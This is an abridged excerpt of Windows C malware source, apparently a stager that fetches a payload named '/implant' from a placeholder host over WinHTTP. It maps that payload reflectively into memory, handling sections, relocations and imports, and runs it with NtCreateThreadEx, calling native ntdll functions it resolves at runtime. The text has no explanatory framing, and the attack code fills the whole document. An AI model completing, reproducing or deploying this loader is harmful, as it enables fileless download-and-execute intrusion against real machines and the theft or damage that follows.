...
static BOOL ResolveFuncs(void) {
    ...
    fnNtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
    fnNtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProcAddress(ntdll, "NtProtectVirtualMemory");
    fnNtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(ntdll, "NtCreateThreadEx");
    fnNtWaitForSingleObject = (pNtWaitForSingleObject)GetProcAddress(ntdll, "NtWaitForSingleObject");
    
    return fnNtAllocateVirtualMemory && fnNtProtectVirtualMemory && fnNtCreateThreadEx && fnNtWaitForSingleObject;
}
...
static PBYTE Download(LPCWSTR host, USHORT port, LPCWSTR path, PDWORD outSize) {
    ...
    hSession = WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    ...
    PVOID baseAddr = NULL;
    if (!NT_SUCCESS(fnNtAllocateVirtualMemory((HANDLE)-1, &baseAddr, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) goto cleanup;
    buf = (PBYTE)baseAddr;
    
    DWORD bytesRead;
    while (WinHttpReadData(hRequest, buf + total, cap - total, &bytesRead) && bytesRead > 0) {
        total += bytesRead;
        if (total >= cap - 0x10000) {
            SIZE_T newSize = cap * 2;
            PVOID newBuf = NULL;
            if (!NT_SUCCESS(fnNtAllocateVirtualMemory((HANDLE)-1, &newBuf, 0, &newSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) goto cleanup;
...
static BOOL MapPE(PBYTE raw, DWORD rawSize, PVOID *outEntry) {
    ...
    if (!NT_SUCCESS(fnNtAllocateVirtualMemory((HANDLE)-1, &baseAddr, 0, &imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)))
        return FALSE;
    ...
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].SizeOfRawData > 0) {
            CopyMemory(mapped + sec[i].VirtualAddress, raw + sec[i].PointerToRawData, sec[i].SizeOfRawData);
        }
    }
    ...
    if (delta != 0 && nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size > 0) {
        PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)(mapped + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        while (reloc->VirtualAddress) {
            ...
            for (DWORD j = 0; j < count; j++) {
                ...
                if (type == IMAGE_REL_BASED_DIR64) {
                    PULONGLONG patch = (PULONGLONG)(mapped + reloc->VirtualAddress + offset);
                    *patch += delta;
    ...
    if (nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size > 0) {
        PIMAGE_IMPORT_DESCRIPTOR imp = (PIMAGE_IMPORT_DESCRIPTOR)(mapped + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
        while (imp->Name) {
            HMODULE mod = LoadLibraryA((LPCSTR)(mapped + imp->Name));
            if (mod) {
                PULONGLONG thunk = (PULONGLONG)(mapped + imp->FirstThunk);
                PULONGLONG origThunk = imp->OriginalFirstThunk ? (PULONGLONG)(mapped + imp->OriginalFirstThunk) : thunk;
                while (*origThunk) {
                    if (*origThunk & IMAGE_ORDINAL_FLAG64) {
                        *thunk = (ULONGLONG)GetProcAddress(mod, (LPCSTR)(*origThunk & 0xFFFF));
                    } else {
                        PIMAGE_IMPORT_BY_NAME name = (PIMAGE_IMPORT_BY_NAME)(mapped + *origThunk);
    ...
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        ...
        if (chr & IMAGE_SCN_MEM_EXECUTE) {
            prot = (chr & IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ;
...
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    ...
    DWORD size = 0;
    PBYTE pe = Download(L"HOST_PLACEHOLDER", PORT_PLACEHOLDER, L"/implant", &size);
    if (!pe || size < 0x100) return 1;
    
    PVOID entry = NULL;
    if (!MapPE(pe, size, &entry)) return 1;
    
    HANDLE hThread = NULL;
    if (!NT_SUCCESS(fnNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, entry, NULL, 0, 0, 0, 0, NULL)))
        return 1;
